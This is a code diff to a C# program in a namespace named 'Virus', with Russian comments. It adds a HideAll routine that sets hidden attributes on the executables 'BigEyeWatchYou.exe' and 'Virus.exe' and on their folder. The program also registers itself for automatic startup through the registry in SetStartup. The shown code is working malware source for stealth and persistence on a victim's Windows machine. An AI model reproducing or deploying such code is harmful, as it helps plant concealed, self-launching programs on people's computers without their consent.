@@ -18,6 +18,7 @@ namespace Virus
         static void Main(string[] args)
         {
             SetStartup();
+            HideAll();
 
             // Получение пути к рабочему столу
             var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
@@ -52,6 +53,20 @@ namespace Virus
         }
 
         /// <summary>
+        /// Меняет атрибуты файлов и директории на скрытые
+        /// </summary>
+        private static void HideAll()
+        {
+            try
+            {
+                File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
+                File.SetAttributes("Virus.exe", FileAttributes.Hidden);
+                new DirectoryInfo(Directory.GetCurrentDirectory()).Attributes |= FileAttributes.Hidden;
+            }
+            catch { }
+        }
+
+        /// <summary>
         /// Добавляет приложение в автозагрузку, если его там нет
         /// </summary>
         private static void SetStartup()
@@ -72,12 +87,7 @@ namespace Virus
 
             if (rk.GetValue(appName) == null)
             {
-                try
-                {
-                    File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
-                    File.SetAttributes("Virus.exe", FileAttributes.Hidden);
-                }
-                catch { }
+                
 
                 rk.SetValue(appName, appFullPath);
             }
